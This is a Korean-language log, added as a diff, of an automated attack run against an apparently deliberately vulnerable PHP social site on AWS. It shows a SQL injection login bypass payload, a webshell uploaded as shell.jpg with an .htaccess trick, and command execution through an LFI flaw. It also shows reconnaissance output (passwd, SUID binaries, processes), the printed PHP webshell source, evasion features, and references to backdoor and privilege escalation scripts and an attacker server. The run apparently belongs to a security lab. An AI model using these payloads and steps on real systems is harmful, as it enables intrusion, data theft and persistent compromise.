@@ -1,0 +1,368 @@
+
+[0;34m[*] 로그 파일: logs/attack_20251106_154256.log[0m
+
+============================================================
+단계 0: 사전 확인
+============================================================
+
+[0;34m[*] 필수 파일 확인...[0m
+[0;32m[+] auto.py 존재[0m
+[0;32m[+] post_exploit.py 존재[0m
+[0;32m[+] privilege_escalation.sh 존재[0m
+[0;32m[+] backdoor_install.sh 존재[0m
+[0;32m[+] run_attack.sh 존재[0m
+
+[0;34m[*] 타겟 서버 연결 확인...[0m
+[0;32m[+] 타겟 서버 응답 확인[0m
+
+[0;34m[*] 공격자 서버 확인...[0m
+[0;32m[+] 공격자 Flask 서버 실행 중[0m
+
+============================================================
+단계 1: 초기 침투 (웹쉘 업로드 + XSS + CSRF)
+============================================================
+
+[0;34m[*] run_attack.sh 실행 중...[0m
+============================================================
+🎯 자동 공격 실행
+============================================================
+타겟 IP:    15.164.95.252
+공격자 IP:  13.158.67.78:5000
+============================================================
+
+📍 1단계: 타겟 서버 DB 초기화
+------------------------------------------------------------
+============================================================
+🗑️  타겟 서버 데이터베이스 초기화
+============================================================
+타겟 IP: 15.164.95.252
+
+⚠️  경고: 이 작업은 타겟 서버의 게시물(posts)을 모두 삭제합니다!
+
+계속하시겠습니까? (y/n): 
+
+🔌 타겟 서버에 접속 중...
+Pseudo-terminal will not be allocated because stdin is not a terminal.
+
+A newer release of "Amazon Linux" is available.
+  Version 2023.9.20251027:
+  Version 2023.9.20251105:
+Run "/usr/bin/dnf check-release-update" for full release and version update info
+   ,     #_
+   ~\_  ####_        Amazon Linux 2023
+  ~~  \_#####\
+  ~~     \###|
+  ~~       \#/ ___   https://aws.amazon.com/linux/amazon-linux-2023
+   ~~       V~' '->
+    ~~~         /
+      ~~._.   _/
+         _/ _/
+       _/m/'
+
+📊 현재 게시물 수 확인 중...
+❌ 데이터베이스 접속 실패
+
+다른 DB 이름일 수 있습니다. 수동으로 확인:
+  sudo -u postgres psql
+  \l                    # DB 목록 확인
+  \c <DB이름>           # DB 선택
+  TRUNCATE TABLE posts; # 게시물 삭제
+
+============================================================
+❌ 초기화 실패
+============================================================
+
+수동으로 접속해서 확인하세요:
+  ssh -i ~/.ssh/id_rsa ec2-user@15.164.95.252
+  sudo -u postgres psql -l    # DB 목록 확인
+
+
+✅ DB 초기화 완료
+
+📍 2단계: 공격 실행 (auto.py)
+------------------------------------------------------------
+
+============================================================
+Vulnerable SNS - Security Assessment v2.0 (Evasion Mode)
+============================================================
+🎯 Target Server: http://15.164.95.252
+⚔️  Attacker Server: http://13.158.67.78:5000
+📅 Assessment Time: 2025-11-06 15:43:07
+
+[*] Evasion features enabled:
+    - User-Agent rotation
+    - Random delays between requests
+    - Legitimate browser headers
+    - Payload obfuscation
+
+[!] Generated files will use CURRENT attacker server: http://13.158.67.78:5000
+============================================================
+
+[*] Initiating authentication bypass tests...
+
+============================================================
+Authentication Testing - SQL Injection & Default Credentials
+============================================================
+[*] Testing SQL Injection payloads first...
+
+[*] Trying: Single quote OR bypass with comment
+    Username: admin
+    Password: ' or '1'='1' --
+    Status Code: 200
+    Final URL: http://15.164.95.252/login.php
+    Cookies: {'PHPSESSID': 'snkhjmvrndl4nj9k4nc6qd0b35'}
+[-] Failed - Still on login page
+
+[*] Trying: Single quote OR bypass without comment
+    Username: admin
+    Password: ' or '1'='1
+    Status Code: 200
+    Final URL: http://15.164.95.252/index.php
+    Cookies: {'PHPSESSID': 'snkhjmvrndl4nj9k4nc6qd0b35'}
+[+] SUCCESS! Logged in (URL redirect to index, Session cookie set, Logout/Welcome found in page)
+    Final URL: http://15.164.95.252/index.php
+    Current Points: 0P
+[*] Using default User ID: 1
+
+[*] Proceeding with file upload tests...
+
+============================================================
+File Upload - Webshell Upload
+============================================================
+[*] Uploading webshell (bypassing .php filter)...
+
+[*] Attempting .htaccess upload to enable PHP execution...
+[+] .htaccess upload attempted (status: 200)
+
+[*] Trying: shell.jpg (JPG with .htaccess)
+    Upload response status: 200
+
+[*] Testing Via file.php LFI: http://15.164.95.252/file.php?name=shell.jpg&cmd=whoami
+[+] SUCCESS! Webshell is working via Via file.php LFI
+    Test command: whoami
+    Output: apacheLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name
+[+] Webshell ready for exploitation!
+    Access URL: http://15.164.95.252/file.php?name=shell.jpg&cmd=<COMMAND>
+
+[*] Testing local file inclusion...
+
+============================================================
+LFI/RCE - Remote Command Execution via Webshell
+============================================================
+
+[*] Testing RCE via webshell: shell.jpg
+[*] Running reconnaissance commands for privilege escalation...
+
+[*] Executing: Current user
+    Command: whoami
+[+] SUCCESS! Command executed
+    Output (566 chars): apacheLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cmd=whoami ✅file.php?name=shell.php5&cmd=ls -la ✅file.php?name=shell.php5&
+
+[*] Executing: User ID and groups
+    Command: id
+[+] SUCCESS! Command executed
+    Output (644 chars): uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0LFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.p
+
+[*] Executing: Current directory
+    Command: pwd
+[+] SUCCESS! Command executed
+    Output (577 chars): /var/www/html/wwwLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cmd=whoami ✅file.php?name=shell.php5&cmd=ls -la ✅file.php?name=
+
+[*] Executing: Directory listing
+    Command: ls -la
+[+] SUCCESS! Command executed
+    Output (1680 chars): total 140
+drwxr-xr-x. 3 ec2-user ec2-user 16384 Nov  6 12:39 .
+drwxrwxrwx. 4 root     root        90 Nov  3 16:22 ..
+-rw-r--r--. 1 ec2-user ec2-user   536 Oct 27 06:20 add_comment.php
+-rw-r-----. 1 root     apache    1642 Nov  3 17:14 config.php
+-rw-r--r--. 1 root     root      1534 Nov  3 17:12 config.php.bak
+-rw-r--r--. 1 ec2-user ec2-user   817 Oct 27 06:22 download.php
+-rw-r--r--. 1 ec2-user e
+
+[*] Executing: User accounts
+    Command: cat /etc/passwd
+[+] SUCCESS! Command executed
+    Output (2613 chars): root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:
+
+[*] Executing: Group information
+    Command: cat /etc/group
+[+] SUCCESS! Command executed
+    Output (1457 chars): root:x:0:
+bin:x:1:
+daemon:x:2:
+sys:x:3:
+adm:x:4:ec2-user
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mem:x:8:
+kmem:x:9:
+wheel:x:10:ec2-user,hongjungsu
+cdrom:x:11:
+mail:x:12:
+man:x:15:
+dialout:x:18:
+floppy:x:19:
+games:x:20:
+tape:x:33:
+video:x:39:
+ftp:x:50:
+lock:x:54:
+audio:x:63:
+users:x:100:
+nobody:x:65534:
+utmp:x:22:
+utempter:x:35:
+dbus:x:81:
+input:x:104:
+kvm:x:36:
+render:x:105:
+sgx:x:106:
+systemd-journal:x:190:ec
+
+[*] Executing: System information
+    Command: uname -a
+[+] SUCCESS! Command executed
+    Output (729 chars): Linux ip-172-31-40-109.ap-northeast-2.compute.internal 6.1.155-176.282.amzn2023.x86_64 #1 SMP PREEMPT_DYNAMIC Tue Oct  7 15:53:25 UTC 2025 x86_64 x86_64 x86_64 GNU/LinuxLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅f
+
+[*] Executing: OS version
+    Command: cat /etc/os-release
+[+] SUCCESS! Command executed
+    Output (1089 chars): NAME="Amazon Linux"
+VERSION="2023"
+ID="amzn"
+ID_LIKE="fedora"
+VERSION_ID="2023"
+PLATFORM_ID="platform:al2023"
+PRETTY_NAME="Amazon Linux 2023.9.20251020"
+ANSI_COLOR="0;33"
+CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2023"
+HOME_URL="https://aws.amazon.com/linux/amazon-linux-2023/"
+DOCUMENTATION_URL="https://docs.aws.amazon.com/linux/"
+SUPPORT_URL="https://aws.amazon.com/premiumsupport/"
+BUG_REPORT_URL="
+
+[*] Executing: Environment variables
+    Command: env
+[+] SUCCESS! Command executed
+    Output (638 chars): PWD=/var/www/html/www
+HOME=/usr/share/httpd
+USER=apache
+SHLVL=0
+_=/usr/bin/envLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cm
+
+[*] Executing: Running processes
+    Command: ps aux
+[+] SUCCESS! Command executed
+    Output (16725 chars): USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.4 174028 18756 ?        Ss   09:36   0:05 /usr/lib/systemd/systemd --switched-root --system --deserialize=32
+root           2  0.0  0.0      0     0 ?        S    09:36   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        I<   09:36   0:00 [rcu_gp]
+root           4  0.0  0.0      0    
+
+[*] Executing: Network connections
+    Command: netstat -tulnp 2>/dev/null || ss -tulnp
+[+] SUCCESS! Command executed
+    Output (3411 chars): Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:44207         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:38205         0.0.0.0:* 
+
+[*] Executing: SUID binaries (privilege escalation)
+    Command: find / -perm -4000 -type f 2>/dev/null
+[+] SUCCESS! Command executed
+    Output (868 chars): /usr/bin/sudo
+/usr/bin/at
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/staprun
+/usr/bin/passwd
+/usr/sbin/grub2-set-bootflag
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/mount.nfs
+/usr/lib64/mariadb/plugin/auth_pam_tool_dir/auth_pam_toolLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두
+[!] HIGH: SUID binaries found (privilege escalation vector)
+    SUID binaries preview: /usr/bin/sudo
+/usr/bin/at
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/staprun
+/usr/bin/passwd
+/usr/sbin/grub2-set-bootflag
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/mount.nfs
+/usr/lib64/mariadb/plugin/auth_pam_tool_dir/auth_
+
+[*] Executing: Sudo privileges
+    Command: sudo -l 2>/dev/null
+[+] SUCCESS! Command executed
+    Output (413 chars): if(isset($_GET["cmd"])) {
+    echo "";
+    $cmd = $_GET["cmd"];
+    if(function_exists('system')) {
+        system($cmd);
+    } elseif(function_exists('exec')) {
+        echo exec($cmd);
+    } elseif(function_exists('shell_exec')) {
+        echo shell_exec($cmd);
+    } elseif(function_exists('passthru')) {
+        passthru($cmd);
+    } else {
+        echo "No execution function available";
+    }
+ 
+
+[*] Executing: Kernel version
+    Command: cat /proc/version
+[+] SUCCESS! Command executed
+    Output (768 chars): Linux version 6.1.155-176.282.amzn2023.x86_64 (mockbuild@ip-10-0-42-236) (gcc (GCC) 11.5.0 20240719 (Red Hat 11.5.0-5), GNU ld version 2.41-50.amzn2023.0.4) #1 SMP PREEMPT_DYNAMIC Tue Oct  7 15:53:25 UTC 2025LFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3
+
+[*] Executing: Scheduled tasks
+    Command: cat /etc/crontab
+[+] SUCCESS! Command executed
+    Output (1009 chars): SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# For details see man 4 crontabs
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+
+Traceback (most recent call last):
+  File "/Users/hwangjunha/Desktop/Red_basic_local/H/auto.py", line 2232, in <module>
+    attacker.run_assessment()
+  File "/Users/hwangjunha/Desktop/Red_basic_local/H/auto.py", line 2148, in run_assessment
+    self.test_lfi()
+  File "/Users/hwangjunha/Desktop/Red_basic_local/H/auto.py", line 548, in test_lfi
+    self._random_delay(1.5, 3.0)
+  File "/Users/hwangjunha/Desktop/Red_basic_local/H/auto.py", line 88, in _random_delay
+    time.sleep(delay)
+KeyboardInterrupt
